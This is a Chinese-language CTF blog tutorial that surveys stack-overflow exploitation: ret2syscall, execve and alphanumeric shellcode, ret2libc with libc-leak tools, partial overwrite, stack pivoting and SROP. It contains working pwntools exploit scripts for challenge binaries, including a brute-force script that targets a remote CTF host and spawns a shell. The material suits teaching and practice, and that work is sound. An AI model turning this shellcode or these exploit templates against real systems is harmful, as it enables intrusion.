---
title: [Pwn]-StackOverflow-Overview
date: 2022-8-3
tags: 
- Pwn
- CTF

categories:
- CTF

toc: true # 是否启用内容索引
sidebar: none # 是否启用sidebar侧边栏，none：不启用
---





### 0x1.杂谈

作为一种基本的漏洞，栈溢出在CTF中出现的非常频繁，因为其多样化的利用形式，难以进行系统的归类，本文结合笔者个人的经验，综合讨论各种栈溢出技术，如果有遗漏，欢迎评论留言，或者给笔者发邮件，进行补充。



本文一定程度上参考了各种博客，CTF-wiki, CTF-All-in-One



怎么去看待栈溢出题呢?   

尽管利用方法多样，但是，就笔者个人的看法而言，整个栈溢出实际上只分为三种:

**ret2syscall,  ret2libc,  ret2shellcode**

实际上应该还有ret2text， 然而实在过于简单，一般不会在ctf题目中出现。

一般而言，pwn题的目的都是`getshell`(当然，也有直接读取flag的，这个后面单独谈)，而`getshell` 无外乎就三种途径，`syscall`，`libc-system`，`shellcode`



当拿到一个题目时，首先思考：

是否有syscall---->ret2syscall

有可读可写内存空间吗---->ret2shellcode

给了libc文件或者有信息泄露函数(IO函数)---->ret2libc

接下来，再分门别类谈:

### 0x1.ret2syscall

因为syscall属于相对简单的，暂且放在前面谈。

| %rax | System call | %rdi                 | %rsi                     | %rdx                     | %r10 | %r8  | %r9  |
| :--- | :---------- | :------------------- | :----------------------- | :----------------------- | :--- | :--- | :--- |
| 59   | sys_execve  | const char *filename | const char *const argv[] | const char *const envp[] |      |      |      |

一般而言，需要`syscall`的题目中，都是构造这个系统调用实现。

而在一些题目中通过`seccomp`禁用了`execve`的调用，所以不能直接利用，那么就利用open, read,  write 直接读取flag文件，也是一种办法。

而在syscall中，最为重要也是最麻烦的一步，就是在哪个地址写入/bin/sh（如果本地文件没有/bin/sh的话），一般而言，有三个选择，.data, .bss， 栈上。

在没开PIE的程序中，可以考虑通过write写入.data段或者买.bss段。

或者考虑通过rsp获取栈上地址，或者partial overwrite带出栈上地址。

总的而言，就是选择能够获取到地址的地方写入/bin/sh。



**例题:**

ciscn_s_3



### 0x2.ret2shellcode

#### 0x2.1.shellcode的书写

一般而言，可以直接通过pwntools 相应模块直接生成shellcode，然而现在以shellcode为考点的题目，一般都会对shellcode做出限制，诸如不能包含可打印字符等等。所以尽可能自己熟悉shellcode的书写。

一个简单的shellcode例子:

```c
// execve(path = '/bin///sh', argv = ['sh'], envp = 0)
push 0x68
mov rax, 0x732f2f2f6e69622f
push rax
mov rdi, rsp
// push argument array ['sh\x00']
// push b'sh\x00' 
push 0x1010101 ^ 0x6873
xor dword ptr [rsp], 0x1010101
xor esi, esi /* 0 */
push rsi /* null terminate */
push 8
pop rsi
add rsi, rsp
push rsi /* 'sh\x00' */
mov rsi, rsp
xor edx, edx /* 0 */
// call execve()
push SYS_execve /* 0x3b */
pop rax
syscall
```

这里获取`/bin/sh`地址的方式，是将其压入栈中，再通过rsp偏移获取相应地址。

不过一般而言，pwn题目运行shellcode，一般是采用寄存器跳转，即`jmp  rax`此类，那么其实可以通过跳转寄存器获取shellcode存放地址，并且将/bin/sh直接镶入shellcode后面，简化shellcode书写。

同时，有些题目会对shellcode有所限制，限制只能包含可打印字符或者纯粹字母数字。这就限制了shellcode的书写，`mov`和`syscall`都会遭到限制， 可用指令如下:

```c
1.数据传送:
push/pop eax…
pusha/popa

2.算术运算:
inc/dec eax…
sub al, 立即数
sub byte ptr [eax… + 立即数], al dl…
sub byte ptr [eax… + 立即数], ah dh…
sub dword ptr [eax… + 立即数], esi edi
sub word ptr [eax… + 立即数], si di
sub al dl…, byte ptr [eax… + 立即数]
sub ah dh…, byte ptr [eax… + 立即数]
sub esi edi, dword ptr [eax… + 立即数]
sub si di, word ptr [eax… + 立即数]

3.逻辑运算:
and al, 立即数
and dword ptr [eax… + 立即数], esi edi
and word ptr [eax… + 立即数], si di
and ah dh…, byte ptr [ecx edx… + 立即数]
and esi edi, dword ptr [eax… + 立即数]
and si di, word ptr [eax… + 立即数]

xor al, 立即数
xor byte ptr [eax… + 立即数], al dl…
xor byte ptr [eax… + 立即数], ah dh…
xor dword ptr [eax… + 立即数], esi edi
xor word ptr [eax… + 立即数], si di
xor al dl…, byte ptr [eax… + 立即数]
xor ah dh…, byte ptr [eax… + 立即数]
xor esi edi, dword ptr [eax… + 立即数]
xor si di, word ptr [eax… + 立即数]

4.比较指令:
cmp al, 立即数
cmp byte ptr [eax… + 立即数], al dl…
cmp byte ptr [eax… + 立即数], ah dh…
cmp dword ptr [eax… + 立即数], esi edi
cmp word ptr [eax… + 立即数], si di
cmp al dl…, byte ptr [eax… + 立即数]
cmp ah dh…, byte ptr [eax… + 立即数]
cmp esi edi, dword ptr [eax… + 立即数]
cmp si di, word ptr [eax… + 立即数]

5.转移指令:
push 56h
pop eax
cmp al, 43h
jnz lable

<=> jmp lable

6.交换al, ah
push eax
xor ah, byte ptr [esp] // ah ^= al
xor byte ptr [esp], ah // al ^= ah
xor ah, byte ptr [esp] // ah ^= al
pop eax

7.清零:
push 44h
pop eax
sub al, 44h ; eax = 0

push esi
push esp
pop eax
xor [eax], esi ; esi = 0
```

一般而言,  我们采用`xor`或者`sub`指令修改shellcode后面的值，构造`0f 05`， 实现syscall。

一个例子(纯字母数字shellcode):

```c
// ref: https://hama.hatenadiary.jp/entry/2017/04/04/190129
/* from call rax */
push rax
push rax
pop rcx

/* XOR pop rsi, pop rdi, syscall */
push 0x41413030
pop rax
xor DWORD PTR [rcx+0x30], eax

/* XOR /bin/sh */
push 0x34303041
pop rax
xor DWORD PTR [rcx+0x34], eax
push 0x41303041
pop rax
xor DWORD PTR [rcx+0x38], eax

/* rdi = &'/bin/sh' */
push rcx
pop rax
xor al, 0x34
push rax

/* rdx = 0 */
push 0x30
pop rax
xor al, 0x30
push rax
pop rdx

push rax

/* rax = 59 (SYS_execve) */
push 0x41
pop rax
xor al, 0x7a

/* pop rsi, pop rdi*/
/* syscall */ 
.byte 0x6e
.byte 0x6f
.byte 0x4e
.byte 0x44

/* /bin/sh */
.byte 0x6e
.byte 0x52
.byte 0x59
.byte 0x5a
.byte 0x6e
.byte 0x43
.byte 0x5a
.byte 0x41
```



构造尽可能短的shellcode可能用到的一些指令

```assembly
cdp  
%The CDQ instruction copies the sign (bit 31) 
%of the value in the EAX register into every bit 
%position in the EDX register. 
```







#### 0x2.2.shellcode生成工具

同时，现在有多种针对shellcode进行编码的生成工具，生成符合限制的shellcode，如msf，alpha3等等，由于我没有用过，可以自行尝试。

#### 0x2.3.mprotect()

进一步的，很多题目没有天然的readable  and  executable segment，题目可能通过mmap()映射了一段权限为7的段，或者存在mprotect()函数。

这个函数可以修改指定内存段的权限

```
mprotect:
int mprotect(void *addr, size_t len, int prot);
addr 内存起始地址
len  修改内存的长度
prot 内存的权限，7为可读可写可执行
```

如果存在这样的函数，可以考虑将其加入ROP链，从而进一步调用shellcode



### 0x3.ret2libc

#### 0x3.1.leak_libc

对于最后调用 libc 中 system 的题目而言，需要考虑的首要问题就是leak_libc.

目前而言，我遇到的栈题中leak_libc，有两种方法：

1. partial_overwrite
   有时候，在栈中会存留libc中地址，在后面存在直接输出的函数的情况下，可以带出此地址。
2. 通过puts，write等函数，打印`.got`，获取对应函数的地址，这里，在没有给定对应libc版本的情况下，也可以通过LibcSearcher查找对应libc版本

```python
# ref:  https://github.com/lieanu/LibcSearcher

from LibcSearcher import *

#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型
obj = LibcSearcher("fgets", 0X7ff39014bd90)

obj.dump("system")        #system 偏移
obj.dump("str_bin_sh")    #/bin/sh 偏移
obj.dump("__libc_start_main_ret")    

```



另一个可以本地部署的实用工具是libc-database

```bash
$ ./find printf 260 puts f30
archive-glibc (libc6_2.19-10ubuntu2_i386)
$ ./dump libc6_2.19-0ubuntu6.6_i386
offset___libc_start_main_ret = 0x19a83
offset_system = 0x00040190
offset_dup2 = 0x000db590
offset_recv = 0x000ed2d0
offset_str_bin_sh = 0x160a24
$ ./identify bid=ebeabf5f7039f53748e996fc976b4da2d486a626
libc6_2.17-93ubuntu4_i386
$ ./identify md5=af7c40da33c685d67cdb166bd6ab7ac0
libc6_2.17-93ubuntu4_i386
$ ./identify sha1=9054f5cb7969056b6816b1e2572f2506370940c4
libc6_2.17-93ubuntu4_i386
$ ./identify sha256=8dc102c06c50512d1e5142ce93a6faf4ec8b6f5d9e33d2e1b45311aef683d9b2
libc6_2.17-93ubuntu4_i386
```





#### 0x3.2.partial_overwrite

##### (1)前置知识

针对没有泄露的赛题，可以考虑partial_overwrite改写`got`表，实现system，因为一般而言，大部分libc函数，里面都存在syscall，所以syscall偏移和函数head_addr差别不会太大。

考虑对于一个`got`表中的64位地址:  0xXXXXXXXXXXXXX， 假设其附近的syscall地址后三位偏移为0xaaa(请确定这个偏移和got内函数偏移只有最后四个16位数字不同)， 因为libc装载地址以页为单位，后三位是确定0x000，那么partial_overwrite覆盖后面两个字节， 即覆盖`got`为0xXXXXXXXXfaaa，那么有1/16的几率恰好syscall

##### (2)爆破脚本写法

一个爆破脚本模板:

```python
from pwn import *
import sys

elf ='./ciscn_s_3'
remote_add = 'node4.buuoj.cn'
remote_port = 29554

main_add = 0x40051d
off = 0x130
system_add = 0x400517
rtframe = 0x4004da
ret_add = 0x4004e9

i = 0

while i < 20:
    try:
        context.log_level = 'debug'
        context.arch = 'amd64'
        if sys.argv[1] == 'r':
            p = remote(remote_add, remote_port, timeout = 1)
        elif sys.argv[1] == 'd':
            p = gdb.debug(elf)
        else:
            p = process(elf, timeout = 1)
        payload1 = b'/bin/sh\0' + cyclic(0x8)
        payload1+= p64(main_add)

        p.sendline(payload1)

        stack_add = u64(p.recv(0x28)[-8::]) - off

        frame = SigreturnFrame()
        frame.rax = 0x3b
        frame.rdi = stack_add
        frame.rsi = 0
        frame.rdx = 0
        frame.rsp = stack_add
        frame.rip = system_add

        payload = b'/bin/sh\0' + cyclic(0x8)
        payload+= p64(rtframe)
        payload+= p64(system_add)
        payload+= bytes(frame)


        #p.sendline('a')
        #p.recvuntil('\0')
        p.sendline(payload)
        p.recvuntil('/bin/sh')
        p.sendline('cat flag')
        print(p.recvline())
        
        p.close()
    except BaseException as e:
        p.close()

    off+=0x8
    i+=1

```

核心模板:

```c
while True:
    try:
		// p = process()
		// pass
        p.sendline('cat flag')
        print(p.recvline())
        p.close()
    except BaseException as e:
        p.close()
    // pass

```

采用grep 获取输出包含flag的行就行



#### 0x3.3.ret2dl_resolve()

延迟绑定会使用_dl_resolve()函数

- _dl_resolve中

  _dl_resolve调用_dl_fixup, _dl_dixup流程：

  1. 通过link_map 获得.dynsym、.dynstr、.rel.plt地址
  2. 通过reloc_offset + ret.plt地址获得函数对应的Elf64_Rel指针
  3. 通过&(ELF64_Rel)->r_info 和.dynsym取得对应Elf64_Sym指针
  4. 检查r_info
  5. 检查&(Elf64_Sym)->st_other
  6. 通过strtab(DT_STRTAB中的地址)+st_name(.dymsym中的偏移)获得函数对应的字符串，进行查找，找到后赋值给rel_addr,最后调用这个函数

综合而言，有如下利用方法(参考CTF-wiki，主要是第三种，因为存在信息泄露时，可用其他方法)

|              | 修改 dynamic 节的内容 | 修改重定位表项的位置                                         | 伪造 linkmap                                         |
| :----------- | :-------------------- | :----------------------------------------------------------- | :--------------------------------------------------- |
| 主要前提要求 | 无                    | 无                                                           | 无信息泄漏时需要 libc                                |
| 适用情况     | NO RELRO              | NO RELRO, Partial RELRO                                      | NO RELRO, Partial RELRO                              |
| 注意点       |                       | 确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应 | 确保重定位位置可写；需要着重伪造重定位表项、符号表； |



### 0x4.Tricks

#### 0x4.1.stack pivoting

栈迁移技巧， 主要针对可溢出字节较少的情况，通过`leave`此类指令控制rsp

```assembly
;leave 相当于:
mov rsp,rbp
pop rbp
;那么考虑将栈帧中rbp地址改为栈迁移目的地址
;leave两次之后，就可以将栈转移到目的地址
;同时要现在目的地址布置好fake_stack
```



可以知道，栈迁移的前提在于，需要提前布置好栈帧，即在.bss ，  或者.data等段写入，一般要求前面有读取到.data段的函数



不过，现在栈迁移一般会稍微复杂一些，读取类函数(如read)和leave可能在一个栈帧，这就要求我们在劫持read写入到指定地址的同时，实现分段栈迁移，大致流程如下:

- 在第一次read读入后将rbp改为要写入的位置
- ret到read
- 第二次read读入的数据将rbp改为写入的ROP链的位置，注意leave后的指令位置会加8
- 这个leave的加8会把我们的rip指向我们第二次写入时的ret位置，只要我们第二次写入的ret位置指向leave，就实现了第二次的栈迁移，迁移到了第二次写入的ROP链的位置

##### example

一个程序反汇编后:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[48]; // [rsp+0h] [rbp-30h] BYREF

  init(argc, argv, envp);
  puts("You can use stackoverflow.");
  puts("But only overflow a bit more...");
  puts("And you must print first.");
  memset(s, 0, 0x20uLL);
  write(1, s, 0x30uLL);
  read(0, s, 0x40uLL);
  return 0;
}
```

这个题目本身比较简单，本身给了你一个泄露，又只开了PIE，通过这个write的泄露可以拿到libc地址，考虑到题目还给了libc，预期解可能是找libc里面的/bin/sh字符串

但是既然没有开PIE，就没有必要这么麻烦了，直接在数据段写入/bin/sh就行

~~虽然大致脚本很早就写完了，但是运行发现了一些令人无语的错误~~

**exp**

```python
from pwn import*

p = process('./ezrop')
#p = gdb.debug('./ezrop')

m = u64(p.recv(40)[-8:])

payloads = p64(0x400863) + b'/bin/sh\0' + p64(0x400600)

payloads += cyclic(0x18)
payloads += p64(0x601848+0x30) + p64(0x4007d9)

p.send(payloads)

sleep(1)

payloads = p64(0x4006fa) + p64(0x400863) + p64(0x601868) + p64(0x400600) 
payloads += b'/bin/sh\0'
payloads += b'/bin/sh\0'
payloads += p64(0x601848-0x8) + p64(0x4007f9)

p.send(payloads)

p.interactive()

#0x00007f7b3ce92bb0      0x00007f7b3ccf8450
```





#### 0x4.2.栈对齐

栈对齐是高版本Ubuntu的一个特性，网上对于这个特性的解释很多都是错误的，还把它与栈平衡搞混了。

这个特性来源于新版本xmm相关指令需要内存对齐，当程序运行到这些指令时，如果内存不是16位对齐，就会直接coredump

可以:

```bash
$ gdb -c core
```

调试core文件

如果终止指令类似于:

```c
 ► 0x7fa8677a3396    movaps xmmword ptr [rsp + 0x40], xmm0
```

说明是栈对齐的原因，小心调整栈帧就行



#### 0x4.3.Stack smash

对于某些将flag装载到内存，并且知道flag的地址、开启了cannary的题目而言，可以考虑stack_smash。

在开启cannary 防护的题目中，检测到栈溢出后，会调用 `__stack_chk_fail` 函数来打印 argv[0] 指针所指向的字符串，而这个地址可以被覆盖，因此，可以利用此实现泄露flag



#### 0x4.4.SROP

##### (1)前置知识:

在进程接收到signal时，内核会将其上下文保存位sigFrame，然后进入signal_handle，对信号处理，返回后，会执行sigreturn调用，恢复保存Frame，主要包括寄存器和控制流(rip，rsp)的一些设置。

那么，当我们伪造一个Frame，并且触发sigreturn调用时，就能控制寄存器和控制流，这也就是SROP的本质。

同一般rop链相比，可以自由控制rax，进一步的，可以自由控制系统调用，所以SROP拓展了ROP的attack methods。



SROP简要流程:

1. 构造fake_frame
2. 控制当前rsp指向fake_frame底部
3. sigreturn调用



sigFrame结构如下:

```c
// x64
struct _fpstate
{
  /* FPU environment matching the 64-bit FXSAVE layout.  */
  __uint16_t        cwd;
  __uint16_t        swd;
  __uint16_t        ftw;
  __uint16_t        fop;
  __uint64_t        rip;
  __uint64_t        rdp;
  __uint32_t        mxcsr;
  __uint32_t        mxcr_mask;
  struct _fpxreg    _st[8];
  struct _xmmreg    _xmm[16];
  __uint32_t        padding[24];
};

struct sigcontext
{
  __uint64_t r8;
  __uint64_t r9;
  __uint64_t r10;
  __uint64_t r11;
  __uint64_t r12;
  __uint64_t r13;
  __uint64_t r14;
  __uint64_t r15;
  __uint64_t rdi;
  __uint64_t rsi;
  __uint64_t rbp;
  __uint64_t rbx;
  __uint64_t rdx;
  __uint64_t rax;
  __uint64_t rcx;
  __uint64_t rsp;
  __uint64_t rip;
  __uint64_t eflags;
  unsigned short cs;
  unsigned short gs;
  unsigned short fs;
  unsigned short __pad0;
  __uint64_t err;
  __uint64_t trapno;
  __uint64_t oldmask;
  __uint64_t cr2;
  __extension__ union
    {
      struct _fpstate * fpstate;
      __uint64_t __fpstate_word;
    };
  __uint64_t __reserved1 [8];
};
```



##### (2)pwntools.srop

pwntools集成了SROP的模块，可以帮助制作fake_frame:

```python
// 一个简单的例子
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = stack_addr
sigframe.rdx = 0x400
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret
```



